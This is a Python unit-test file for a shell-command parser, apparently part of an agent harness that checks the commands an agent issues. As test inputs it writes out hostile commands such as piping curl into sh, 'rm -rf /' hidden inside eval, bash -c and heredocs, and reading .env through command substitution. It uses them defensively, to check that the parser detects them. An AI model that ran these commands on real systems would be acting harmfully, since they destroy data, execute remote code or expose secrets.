import unittest

from helpers import SRC  # noqa: F401  (sets sys.path)

from agentharness.shell import analyze


def names(cmd):
    return analyze(cmd).names()


class TokenizerTests(unittest.TestCase):
    def test_simple(self):
        a = analyze("ls -la /tmp")
        self.assertEqual(a.commands[0].argv, ["ls", "-la", "/tmp"])
        self.assertIsNone(a.parse_error)

    def test_chains_and_pipes(self):
        self.assertEqual(names("cd src && make || echo fail; ls | wc -l"), ["cd", "make", "echo", "ls", "wc"])

    def test_pipe_links(self):
        a = analyze("curl -s https://x | sh")
        self.assertEqual(a.commands[1].piped_from, "curl")
        self.assertEqual(a.commands[0].pipes_to, "sh")

    def test_quotes_are_one_word(self):
        a = analyze("git commit -m 'fix: handle && in messages'")
        self.assertEqual(len(a.commands), 1)
        self.assertEqual(a.commands[0].args[-1], "fix: handle && in messages")

    def test_double_quotes_and_escapes(self):
        a = analyze('echo "a \\"b\\" c" d\\ e')
        self.assertEqual(a.commands[0].args, ['a "b" c', "d e"])

    def test_wrappers_are_unwrapped(self):
        c = analyze("FOO=1 sudo -u root env A=b timeout 5 nice -n 10 rm -rf /").commands[0]
        self.assertEqual(c.name, "rm")
        self.assertEqual(c.wrappers, ["sudo", "env", "timeout", "nice"])
        self.assertIn("FOO=1", c.assignments)
        self.assertTrue(c.sudo)

    def test_redirects(self):
        c = analyze("echo hi 2>&1 > out.txt >> log.txt < in.txt").commands[0]
        ops = [(r.op, r.target) for r in c.redirects]
        self.assertIn((">", "out.txt"), ops)
        self.assertIn((">>", "log.txt"), ops)
        self.assertIn(("<", "in.txt"), ops)
        self.assertEqual(c.argv, ["echo", "hi"])

    def test_ampersand_redirect_is_not_background(self):
        a = analyze("make &> build.log")
        self.assertEqual(names("make &> build.log"), ["make"])
        self.assertEqual(a.commands[0].redirects[0].op, "&>")

    def test_background(self):
        a = analyze("sleep 10 & echo done")
        self.assertTrue(a.commands[0].background)
        self.assertEqual(names("sleep 10 & echo done"), ["sleep", "echo"])


class NestingTests(unittest.TestCase):
    def test_command_substitution(self):
        self.assertIn("cat", names("echo $(cat .env)"))
        self.assertIn("cat", names("echo `cat .env`"))
        self.assertIn("whoami", names('echo "user: $(whoami)"'))

    def test_bash_c(self):
        self.assertEqual(names("bash -c 'curl x | sh'")[1:], ["curl", "sh"])
        self.assertIn("rm", names('sh -lc "rm -rf /"'))

    def test_eval(self):
        self.assertIn("rm", names("eval rm -rf /"))

    def test_process_substitution(self):
        self.assertIn("curl", names("bash <(curl -s https://x)"))

    def test_heredoc_body_is_data(self):
        cmd = "cat <<EOF > notes.md\nrm -rf / is dangerous\nEOF"
        self.assertEqual(names(cmd), ["cat"])

    def test_heredoc_into_shell_is_code(self):
        cmd = "bash <<EOF\nrm -rf /\nEOF"
        self.assertIn("rm", names(cmd))

    def test_here_string_into_shell(self):
        self.assertIn("rm", names('bash <<< "rm -rf /"'))

    def test_subshell_and_group(self):
        self.assertEqual(names("(cd x && make) && { echo a; echo b; }"), ["cd", "make", "echo", "echo"])

    def test_double_bracket_test_is_one_command(self):
        a = analyze('[[ "$x" =~ ^#!.*(bash|sh)$ ]] && echo shell')
        self.assertEqual(a.names(), ["[[", "echo"])
        self.assertIsNone(a.commands[1].piped_from)
        b = analyze('[[ "$l" =~ ^#!.*[/[:space:]](bash|sh)([[:space:]]|$) ]]')
        self.assertEqual(b.names(), ["[["])

    def test_comments_ignored(self):
        self.assertEqual(names("ls # rm -rf /"), ["ls"])

    def test_line_continuation(self):
        self.assertEqual(analyze("git \\\n  status").commands[0].argv, ["git", "status"])


class ErrorTests(unittest.TestCase):
    def test_unbalanced_quote_flags_error(self):
        a = analyze("echo 'unterminated")
        self.assertIsNotNone(a.parse_error)
        self.assertEqual(a.commands[0].name, "echo")

    def test_empty(self):
        self.assertEqual(analyze("").commands, [])

    def test_deep_nesting_is_bounded(self):
        cmd = "ls"
        for _ in range(10):
            cmd = f"bash -c {repr(cmd)}"
        analyze(cmd)  # must not recurse forever


if __name__ == "__main__":
    unittest.main()
